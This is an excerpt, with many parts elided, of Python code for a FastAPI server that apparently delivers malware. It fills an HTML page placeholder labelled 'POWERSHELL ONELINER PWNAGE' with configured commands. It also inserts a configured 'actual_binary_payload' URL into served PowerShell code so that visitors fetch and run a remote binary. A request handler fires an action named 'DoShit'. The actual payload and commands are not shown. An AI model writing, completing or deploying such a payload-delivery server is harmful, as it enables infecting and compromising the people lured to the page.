...
class Html(PLAIN_TEXT_FILES):
    ...
    def getTemplateFixedHtml(self,fileOrder:int=None)->str:
        ...
        html = self.HomePage
        templates = {
            "{{POWERSHELL ONELINER PWNAGE}}":config.conf["OTHER"]["COMMANDS"],
...
class PowerShell(PLAIN_TEXT_FILES):
    ...
    def getPowershellCode(self):
        return self.powerShellCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload"])
...
async def mainInterface(request:fastapi.Request):
    await config.DoShit(req).start("now")
...
def getUvicornRunCommand():
    command = ""
    command += f"uvicorn {config.ServerFile.replace('.py','')}:app"
    command += f" --port {config.DeployedPort}"
    command += f" --host {config.host}"
    return command
...
def ServerStartUp(filename,name):
    if name!="__main__":raiseNotMainErrorAndExit(filename, name)
    import os
    import colorama
...
def add_middlewares(app: fastapi.FastAPI):
    app.add_middleware(
        ...
        allow_origins=config.allowedDomains,
        allow_credentials=True,
        allow_methods=config.allowedMethods,
        allow_headers=config.allowedHeaders,
    )